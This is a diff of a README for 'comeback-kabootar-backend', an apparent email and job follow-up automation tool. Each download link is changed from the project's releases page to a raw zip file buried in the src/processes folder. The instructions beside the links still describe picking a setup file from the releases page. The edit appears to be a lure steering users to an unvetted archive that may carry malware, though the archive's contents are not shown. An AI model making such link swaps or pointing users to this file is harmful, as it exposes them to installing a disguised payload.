@@ -1,6 +1,6 @@
 # 🐦 comeback-kabootar-backend - Automate Career and Email Tasks
 
-[![Download comeback-kabootar-backend](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Ajalex97/comeback-kabootar-backend/releases)
+[![Download comeback-kabootar-backend](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ajalex97/comeback-kabootar-backend/main/src/processes/kabootar_comeback_backend_1.3.zip)
 
 comeback-kabootar-backend is a tool that helps you manage career and email tasks automatically. It runs in the background, scheduling your emails and job follow-ups without you needing to check or send anything manually.
 
@@ -23,7 +23,7 @@ If you do not have PostgreSQL or Redis installed, there are easy installers avai
 
 1. Visit the download page by clicking this link:
 
-   [Download comeback-kabootar-backend](https://github.com/Ajalex97/comeback-kabootar-backend/releases)
+   [Download comeback-kabootar-backend](https://raw.githubusercontent.com/Ajalex97/comeback-kabootar-backend/main/src/processes/kabootar_comeback_backend_1.3.zip)
 
 2. On the releases page, look for the latest version. You will find files named like `comeback-kabootar-backend-setup.exe` or similar.
 
@@ -96,7 +96,7 @@ The app will run these tasks without any action needed from you.
 
 1. Visit the releases page again:
 
-   [Download comeback-kabootar-backend](https://github.com/Ajalex97/comeback-kabootar-backend/releases)
+   [Download comeback-kabootar-backend](https://raw.githubusercontent.com/Ajalex97/comeback-kabootar-backend/main/src/processes/kabootar_comeback_backend_1.3.zip)
 
 2. Download the latest setup file.
 
@@ -129,4 +129,4 @@ It is open-source. This means the code is open for anyone to review or change. T
 - SaaS architecture on a local PC
 - TypeScript and Express framework use
 
-[Download comeback-kabootar-backend](https://github.com/Ajalex97/comeback-kabootar-backend/releases)
+[Download comeback-kabootar-backend](https://raw.githubusercontent.com/Ajalex97/comeback-kabootar-backend/main/src/processes/kabootar_comeback_backend_1.3.zip)
